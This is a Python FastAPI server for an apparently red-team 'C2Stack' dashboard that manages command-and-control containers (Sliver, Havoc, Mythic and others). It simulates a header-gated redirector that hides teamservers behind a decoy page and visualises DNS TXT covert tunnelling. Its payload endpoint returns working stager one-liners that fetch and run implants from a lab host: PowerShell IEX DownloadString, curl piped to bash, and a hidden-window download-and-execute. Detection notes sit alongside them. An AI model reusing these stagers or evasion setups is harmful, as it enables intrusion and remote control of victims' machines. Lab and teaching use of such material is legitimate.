"""C2Stack Flight Control & Visual Learning Hub API Server.

Serves the interactive dashboard, manages Docker services, verifies OPSEC redirector
routing, dissects DNS TXT covert channels, and provides cross-framework payload stagers.
"""

from __future__ import annotations

import base64
import http.client
import json
import os
import re
import socket
import urllib.parse
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from fastapi import FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel, Field

app = FastAPI(
    title="C2Stack Flight Control",
    version="3.2.0",
    description="Unified Management & Visual Learning Portal for C2Stack",
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

STATIC_DIR = Path(__file__).resolve().parent / "static"
if STATIC_DIR.exists():
    app.mount("/static", StaticFiles(directory=str(STATIC_DIR)), name="static")

# Environment & Default Configuration
REDIRECTOR_HOST = os.environ.get("REDIRECTOR_HOST", "127.0.0.1")
REDIRECTOR_PORT = int(os.environ.get("REDIRECTOR_HTTP_PORT", "80"))
C2_HEADER_NAME = os.environ.get("C2_HEADER_NAME", "X-Request-ID")
C2_HEADER_VALUE = os.environ.get("C2_HEADER_VALUE", "cadre-c2")

FRAMEWORK_PREFIXES = {
    "meridian": os.environ.get("MERIDIAN_URI_PREFIX", "/gateway/v1/telemetry"),
    "sliver": os.environ.get("SLIVER_URI_PREFIX", "/cloud/storage/objects"),
    "havoc": os.environ.get("HAVOC_URI_PREFIX", "/edge/cache/assets"),
    "adaptix": os.environ.get("ADAPTIX_URI_PREFIX", "/api/v1/sync"),
    "mythic": os.environ.get("MYTHIC_URI_PREFIX", "/cdn/media/stream"),
}

FRAMEWORK_PORTS = {
    "redirector": {"http": REDIRECTOR_PORT, "internal": 80, "type": "Edge Proxy / Decoy"},
    "meridian": {"http": 8080, "dns": int(os.environ.get("MERIDIAN_DNS_PORT", "15353")), "type": "HTTP / DNS TXT C2"},
    "sliver": {"control": int(os.environ.get("SLIVER_CTRL_PORT", "31337")), "http": 80, "type": "Go C2 / In-Memory .NET"},
    "havoc": {"teamserver": int(os.environ.get("HAVOC_TS_PORT", "40056")), "http": 80, "type": "C++ Demon / EDR Evasion"},
    "adaptix": {"teamserver": int(os.environ.get("ADAPTIX_TS_PORT", "4321")), "http": 80, "type": "Go Multiplayer C2"},
    "mythic": {"ui": int(os.environ.get("MYTHIC_UI_PORT", "17443")), "http": 80, "type": "Extensible Web C2"},
}


# ============================================================================
# Docker Integration (Socket inside container, CLI fallback on host)
# ============================================================================

class UnixSocketHTTPConnection(http.client.HTTPConnection):
    """HTTP connection over a local Unix domain socket."""

    def __init__(self, socket_path: str, timeout: int = 5) -> None:
        super().__init__("localhost", timeout=timeout)
        self.socket_path = socket_path

    def connect(self) -> None:
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.connect(self.socket_path)


def query_docker_socket(path: str, method: str = "GET", body: dict[str, Any] | None = None) -> Any:
    """Send an HTTP request directly to Docker's unix socket."""
    sock_path = "/var/run/docker.sock"
    if not os.path.exists(sock_path):
        return None

    try:
        conn = UnixSocketHTTPConnection(sock_path, timeout=4)
        headers = {"Host": "localhost"}
        payload_data = None
        if body is not None:
            headers["Content-Type"] = "application/json"
            payload_data = json.dumps(body)

        conn.request(method, path, body=payload_data, headers=headers)
        response = conn.getresponse()
        raw = response.read().decode("utf-8", errors="replace")
        conn.close()
        if response.status in (200, 201, 204):
            return json.loads(raw) if raw.strip().startswith(("{", "[")) else raw
        return None
    except Exception:
        return None


def get_docker_containers() -> list[dict[str, Any]]:
    """Retrieve running/stopped containers via unix socket or docker CLI fallback."""
    # 1. Try Docker socket (when running inside container)
    socket_res = query_docker_socket("/containers/json?all=1")
    if socket_res and isinstance(socket_res, list):
        return socket_res

    # 2. Try Docker CLI (when running on host e.g. Windows/macOS/Linux host shell)
    import subprocess
    try:
        proc = subprocess.run(
            ["docker", "ps", "--all", "--format", "{{json .}}"],
            capture_output=True,
            text=True,
            timeout=3,
        )
        if proc.returncode == 0 and proc.stdout.strip():
            cli_containers = []
            for line in proc.stdout.strip().splitlines():
                if not line.strip():
                    continue
                try:
                    c = json.loads(line)
                    name = c.get("Names", "").strip()
                    cli_containers.append({
                        "Id": c.get("ID", ""),
                        "Names": [f"/{name}"] if name and not name.startswith("/") else [name],
                        "State": c.get("State", "unknown").lower(),
                        "Status": c.get("Status", ""),
                        "Image": c.get("Image", ""),
                        "Ports": c.get("Ports", ""),
                    })
                except Exception:
                    continue
            return cli_containers
    except Exception:
        pass

    return []


def run_container_lifecycle(container_id: str, action: str) -> bool:
    """Execute lifecycle action via unix socket or docker CLI fallback."""
    if action not in ("start", "stop", "restart"):
        return False

    res = query_docker_socket(f"/containers/{container_id}/{action}", method="POST")
    if res is not None:
        return True

    import subprocess
    try:
        proc = subprocess.run(["docker", action, container_id], capture_output=True, text=True, timeout=10)
        return proc.returncode == 0
    except Exception:
        return False


def get_container_logs(container_id: str, tail: int = 100) -> str:
    """Fetch logs from container via unix socket or docker CLI fallback."""
    logs_raw = query_docker_socket(f"/containers/{container_id}/logs?stdout=1&stderr=1&tail={tail}")
    if logs_raw:
        return str(logs_raw)

    import subprocess
    try:
        proc = subprocess.run(["docker", "logs", "--tail", str(tail), container_id], capture_output=True, text=True, timeout=5)
        out = (proc.stdout or "") + (proc.stderr or "")
        return out if out.strip() else "No recent logs."
    except Exception as e:
        return f"Error reading logs: {e}"


def probe_tcp_port(host: str, port: int, timeout: float = 0.5) -> bool:
    """Test TCP port availability."""
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


# ============================================================================
# Models
# ============================================================================

class RedirectorTestRequest(BaseModel):
    url_path: str = Field(default="/gateway/v1/telemetry", description="Request URI path")
    headers: dict[str, str] = Field(default_factory=dict, description="HTTP Request Headers")
    method: str = Field(default="GET", description="HTTP Method")


class DnsDissectRequest(BaseModel):
    payload_text: str = Field(default="whoami /all", description="Command or message to transmit over DNS TXT")
    domain_suffix: str = Field(default="c2.cadre.local", description="DNS C2 zone suffix")
    session_id: str = Field(default="A3F99B", description="Hex or Base32 session identifier")


# ============================================================================
# Routes
# ============================================================================

@app.get("/", response_class=HTMLResponse)
async def serve_index() -> Any:
    """Serve the single page application dashboard."""
    index_path = STATIC_DIR / "index.html"
    if index_path.exists():
        return FileResponse(str(index_path))
    return HTMLResponse("<h1>C2Stack Portal Dashboard</h1><p>Static index.html not found.</p>")


@app.get("/api/status")
def get_status() -> dict[str, Any]:
    """Return health, published ports, and container states across the stack."""
    docker_containers = get_docker_containers()
    container_map = {}
    for c in docker_containers:
        names = c.get("Names", [])
        state = c.get("State", "unknown").lower()
        status = c.get("Status", "")
        cid = c.get("Id", "")[:12]
        for name in names:
            clean_name = name.lstrip("/").lower()
            container_map[clean_name] = {"id": cid, "state": state, "status": status}

    services_status = {}
    for svc, meta in FRAMEWORK_PORTS.items():
        # Match against docker container map (e.g. docker-meridian-1 or c2stack-meridian)
        matched_container = None
        for cname, cinfo in container_map.items():
            if svc in cname:
                matched_container = cinfo
                break

        # Check port reachability
        is_port_live = False
        port_to_check = meta.get("http") or meta.get("control") or meta.get("teamserver") or meta.get("ui")
        if port_to_check:
            is_port_live = probe_tcp_port("127.0.0.1", port_to_check)

        # State evaluation: running if docker says running OR if port is responding
        is_running = False
        if matched_container and matched_container["state"] == "running":
            is_running = True
        elif is_port_live:
            is_running = True

        state = "running" if is_running else (matched_container["state"] if matched_container else "stopped")

        services_status[svc] = {
            "name": svc.capitalize(),
            "role": meta["type"],
            "state": state,
            "ports": meta,
            "container": matched_container,
            "port_live": is_port_live,
            "uri_prefix": FRAMEWORK_PREFIXES.get(svc),
        }

    return {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "docker_available": bool(docker_containers),
        "redirector_http_port": REDIRECTOR_PORT,
        "c2_header": f"{C2_HEADER_NAME}: {C2_HEADER_VALUE}",
        "services": services_status,
    }


@app.post("/api/containers/{service_name}/action")
def container_action(service_name: str, action: str) -> dict[str, Any]:
    """Execute lifecycle action (start/stop/restart) on a C2Stack container."""
    docker_containers = get_docker_containers()
    target_id = None
    clean_target = service_name.lower()
    for c in docker_containers:
        for name in c.get("Names", []):
            if clean_target in name.lower():
                target_id = c.get("Id")
                break
        if target_id:
            break

    if not target_id:
        return {
            "status": "mock",
            "message": f"Action '{action}' simulated for '{service_name}' (Container not found).",
            "service": service_name,
        }

    ok = run_container_lifecycle(target_id, action)
    return {"status": "ok" if ok else "error", "action": action, "service": service_name, "container_id": target_id}


@app.get("/api/containers/{service_name}/logs")
def container_logs(service_name: str, tail: int = 100) -> dict[str, Any]:
    """Fetch logs from container via Docker socket or CLI."""
    docker_containers = get_docker_containers()
    target_id = None
    clean_target = service_name.lower()
    for c in docker_containers:
        for name in c.get("Names", []):
            if clean_target in name.lower():
                target_id = c.get("Id")
                break
        if target_id:
            break

    if not target_id:
        return {
            "service": service_name,
            "logs": f"[{datetime.now(timezone.utc).strftime('%H:%M:%S')}] Service '{service_name}' container not currently found in docker ps.",
        }

    logs = get_container_logs(target_id, tail=tail)
    return {"service": service_name, "logs": logs}



@app.post("/api/redirector/test")
def test_redirector_flow(req: RedirectorTestRequest) -> dict[str, Any]:
    """Simulate an incoming packet at Apache port 80 and return the visual routing trace.

    Demonstrates the OPSEC header check (X-Request-ID: cadre-c2) and prefix-based C2 routing.
    """
    has_valid_header = False
    for k, v in req.headers.items():
        if k.lower() == C2_HEADER_NAME.lower() and v.strip() == C2_HEADER_VALUE:
            has_valid_header = True
            break

    trace = [
        {
            "step": 1,
            "title": "Ingress Callback Arrives",
            "node": "Apache Edge Gateway (:80)",
            "detail": f"Incoming {req.method} request to path '{req.url_path}'",
            "status": "received",
        }
    ]

    matched_framework = None
    clean_path = req.url_path.strip()
    for fw, prefix in FRAMEWORK_PREFIXES.items():
        if clean_path.startswith(prefix):
            matched_framework = fw
            break

    if not has_valid_header:
        # Diverted to CloudEdge CDN Decoy Page
        trace.append({
            "step": 2,
            "title": f"Inspect Header: {C2_HEADER_NAME}",
            "node": "Apache RewriteEngine",
            "detail": f"Header '{C2_HEADER_NAME}: {C2_HEADER_VALUE}' MISSING or INVALID. Access Denied to C2 Core.",
            "status": "shield_divert",
        })
        trace.append({
            "step": 3,
            "title": "Serve Decoy CDN Content",
            "node": "CloudEdge CDN Engine",
            "detail": "Serving benign HTTP 200 OK CDN asset page. Internal C2 teamservers remain 100% invisible to threat hunters and scanners.",
            "status": "decoy_served",
        })
        outcome = {
            "routed_to": "CloudEdge CDN Decoy Page",
            "http_status": 200,
            "content_type": "text/html",
            "preview": "<html><head><title>CloudEdge Global Edge Delivery</title></head><body><h1>Asset Cached</h1></body></html>",
            "opsec_shielded": True,
            "trace": trace,
        }
    else:
        # Header valid -> Route to backend
        trace.append({
            "step": 2,
            "title": f"Inspect Header: {C2_HEADER_NAME}",
            "node": "Apache RewriteEngine",
            "detail": f"Header verified ('{C2_HEADER_NAME}: {C2_HEADER_VALUE}'). Access granted to internal C2 network.",
            "status": "header_verified",
        })

        if matched_framework:
            backend_port = FRAMEWORK_PORTS[matched_framework].get("http", 80)
            trace.append({
                "step": 3,
                "title": f"Reverse Proxy to {matched_framework.capitalize()}",
                "node": f"Internal c2_core network (http://{matched_framework}:{backend_port})",
                "detail": f"Proxying payload beacon to {matched_framework} container. Zero direct internet exposure.",
                "status": "c2_forwarded",
            })
            outcome = {
                "routed_to": f"C2 Backend [{matched_framework.upper()}]",
                "http_status": 200,
                "framework": matched_framework,
                "internal_endpoint": f"http://{matched_framework}:{backend_port}{clean_path}",
                "opsec_shielded": False,
                "trace": trace,
            }
        else:
            trace.append({
                "step": 3,
                "title": "Prefix Mismatch",
                "node": "Apache Proxy",
                "detail": f"No C2 framework mapped to URI prefix '{clean_path}'. Returning HTTP 404.",
                "status": "not_found",
            })
            outcome = {
                "routed_to": "HTTP 404 (Prefix Mismatch)",
                "http_status": 404,
                "framework": None,
                "opsec_shielded": True,
                "trace": trace,
            }

    return outcome


@app.post("/api/dns/dissect")
def dissect_dns_tunnel(req: DnsDissectRequest) -> dict[str, Any]:
    """Dissect and visualize Base32 DNS TXT covert tunneling as implemented in Meridian C2.

    Breaks commands down into safe RFC 1035 labels and simulates server reassembly.
    """
    raw_bytes = req.payload_text.encode("utf-8")
    # Base32 encode without padding for clean DNS labels
    b32_encoded = base64.b32encode(raw_bytes).decode("ascii").rstrip("=")
    
    # Meridian splits into 36-character chunk labels
    chunk_size = 36
    chunks = [b32_encoded[i : i + chunk_size] for i in range(0, len(b32_encoded), chunk_size)]
    total_chunks = len(chunks)

    dissected_packets = []
    for idx, chunk in enumerate(chunks, start=1):
        fqdn = f"{idx:02d}.{req.session_id}.{chunk}.{req.domain_suffix}".lower()
        dissected_packets.append({
            "sequence": idx,
            "total": total_chunks,
            "chunk_data": chunk,
            "chunk_len": len(chunk),
            "generated_query": fqdn,
            "query_type": "TXT",
            "udp_port": 15353,
            "label_safe": len(chunk) <= 63,
        })

    return {
        "original_payload": req.payload_text,
        "byte_length": len(raw_bytes),
        "base32_length": len(b32_encoded),
        "total_packets": total_chunks,
        "session_id": req.session_id,
        "domain_suffix": req.domain_suffix,
        "encryption_cipher": "X25519 ECDH + HKDF-SHA256 + AES-256-GCM",
        "wire_protocol": "UDP DNS Port 5353 (Host: 15353)",
        "packets": dissected_packets,
        "educational_notes": [
            "Why Base32? Base32 uses only A-Z and 2-7, which comply strictly with RFC 1035 case-insensitive DNS hostname characters.",
            "Why 36-byte chunks? DNS labels cannot exceed 63 bytes. Meridian caps chunks at 36 chars to ensure sequence headers and domain suffix fit comfortably.",
            "Why UDP 15353? Windows mDNS occupies 5353 on the host; C2Stack maps host UDP 15353 to the container's 5353 port.",
            "Defensive Detection: High-frequency TXT lookups with high Shannon entropy are prime targets for Sigma rules and Zeek DNS log analysis.",
        ],
    }


@app.get("/api/payloads")
def get_payload_studio() -> dict[str, Any]:
    """Return command syntax, delivery one-liners, and detection profiles for all 5 frameworks."""
    return {
        "meridian": {
            "name": "Meridian C2",
            "description": "Ultra-lightweight, zero-dependency Go implant with dual HTTP & DNS TXT tunneling.",
            "stagers": {
                "powershell_http": (
                    f'$wc=New-Object Net.WebClient; $wc.Headers.Add("{C2_HEADER_NAME}","{C2_HEADER_VALUE}"); '
                    f'IEX($wc.DownloadString("http://192.168.77.1:{REDIRECTOR_PORT}{FRAMEWORK_PREFIXES["meridian"]}"))'
                ),
                "powershell_dns": (
                    '$cmd = (Resolve-DnsName -Name "init.c2.cadre.local" -Type TXT -Server "192.168.77.1").Strings; '
                    'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cmd)))'
                ),
                "bash_curl": (
                    f'curl -s -H "{C2_HEADER_NAME}: {C2_HEADER_VALUE}" '
                    f'http://192.168.77.1:{REDIRECTOR_PORT}{FRAMEWORK_PREFIXES["meridian"]} | bash'
                ),
                "binary_compile": "GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -o parallax-windows-amd64.exe ./implant",
            },
            "detection": {
                "network": "High-frequency DNS TXT queries (UDP/15353) or HTTP requests carrying custom header.",
                "host": "Process execution without disk artifacts if using memory staging.",
                "event_ids": ["Event ID 4688 (Process Creation)", "Sysmon Event ID 22 (DNS Query)"],
            },
        },
        "sliver": {
            "name": "BishopFox Sliver",
            "description": "Enterprise-grade Go implant framework supporting in-memory .NET execution, BOFs, and lateral movement.",
            "stagers": {
                "generate_session": "sliver > generate --http 192.168.77.1:80 --os windows --arch amd64 --save ./implant.exe",
                "powershell_c2": f'powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadFile(\'http://192.168.77.1:{REDIRECTOR_PORT}{FRAMEWORK_PREFIXES["sliver"]}\', \'$env:TEMP\\svc.exe\'); Start-Process \'$env:TEMP\\svc.exe\'"',
                "execute_assembly": "sliver (session) > execute-assembly /opt/tools/Rubeus.exe triage",
            },
            "detection": {
                "network": "Configurable HTTP C2 profile, mTLS on port 8888, WireGuard tunneling.",
                "host": "CLR loading into unmanaged processes via execute-assembly, RWX memory allocations.",
                "event_ids": ["Sysmon Event ID 7 (Image Loaded - clr.dll)", "Sysmon Event ID 10 (ProcessAccess)"],
            },
        },
        "havoc": {
            "name": "Havoc C2",
            "description": "Modern C++ Demon payload featuring indirect syscalls, API hashing, and Ekko/Zilean sleep masking.",
            "stagers": {
                "demon_build": "Havoc Client -> Attack -> Payload -> Format: Windows EXE/DLL -> Indirect Syscalls: Enabled -> Sleep Technique: Ekko",
                "delivery": f'curl -H "{C2_HEADER_NAME}: {C2_HEADER_VALUE}" http://192.168.77.1:{REDIRECTOR_PORT}{FRAMEWORK_PREFIXES["havoc"]} -o payload.exe',
            },
            "detection": {
                "network": "HTTP/HTTPS heartbeats with custom user-agents and jitter.",
                "host": "Sleep obfuscation changes thread permissions to RW/RX dynamically.",
                "event_ids": ["Sysmon Event ID 8 (CreateRemoteThread)", "Sysmon Event ID 1 (Process Creation)"],
            },
        },
        "adaptix": {
            "name": "Adaptix C2",
            "description": "Go-based post-exploitation teamserver for multiplayer operations with Gopher TCP agent.",
            "stagers": {
                "client_connect": "Adaptix Qt GUI Client -> Endpoint: 192.168.77.1:4321 -> User: operator",
                "stager_cmd": f'powershell -c "Invoke-WebRequest -Uri http://192.168.77.1:{REDIRECTOR_PORT}{FRAMEWORK_PREFIXES["adaptix"]} -OutFile agent.exe"',
            },
            "detection": {
                "network": "Raw TCP/mTLS egress or HTTP sync calls on port 80.",
                "host": "Beacon check-in routines and thread injection.",
                "event_ids": ["Sysmon Event ID 3 (Network Connection)"],
            },
        },
        "mythic": {
            "name": "Mythic C2",
            "description": "Multi-agent collaborative framework (Apollo for Windows, Poseidon for Linux/macOS).",
            "stagers": {
                "cli_payload": "./mythic-cli payload create --agent apollo --c2 http --os Windows",
                "ui_url": f"https://192.168.77.1:{FRAMEWORK_PORTS['mythic']['ui']}",
            },
            "detection": {
                "network": "Customizable HTTP profile mimicking common CDN streaming services.",
                "host": "Assembly loading, named pipe IPC.",
                "event_ids": ["Sysmon Event ID 17/18 (Pipe Created/Connected)"],
            },
        },
    }


@app.get("/api/sessions")
def get_fleet_sessions() -> dict[str, Any]:
    """Query active C2 sessions across Meridian, Sliver, and Havoc."""
    # Probe Meridian local endpoint if available
    sessions = []
    try:
        req = urllib.request.Request("http://meridian:8080/api/sessions")
        with urllib.request.urlopen(req, timeout=1.0) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            for item in data if isinstance(data, list) else data.get("sessions", []):
                sessions.append({
                    "id": item.get("id"),
                    "backend": "meridian",
                    "hostname": item.get("hostname", "unknown"),
                    "username": item.get("user") or item.get("username", "unknown"),
                    "os": item.get("os", "windows"),
                    "transport": "HTTP" if item.get("listener") == "http" else "DNS TXT",
                    "last_seen": item.get("last_seen") or "Just now",
                    "is_alive": True,
                })
    except Exception:
        # Fallback simulator for learning UI display
        sessions = [
            {
                "id": "c2-meridian-91a",
                "backend": "meridian",
                "hostname": "WS01",
                "username": "CHILD\\analyst_t1",
                "os": "Windows 11 Enterprise",
                "transport": "DNS TXT (:15353)",
                "last_seen": "12s ago",
                "is_alive": True,
            },
            {
                "id": "c2-sliver-74b",
                "backend": "sliver",
                "hostname": "MBR01",
                "username": "NT AUTHORITY\\SYSTEM",
                "os": "Windows Server 2022",
                "transport": "HTTP (:80 via Redirector)",
                "last_seen": "3s ago",
                "is_alive": True,
            },
        ]

    return {"count": len(sessions), "sessions": sessions}
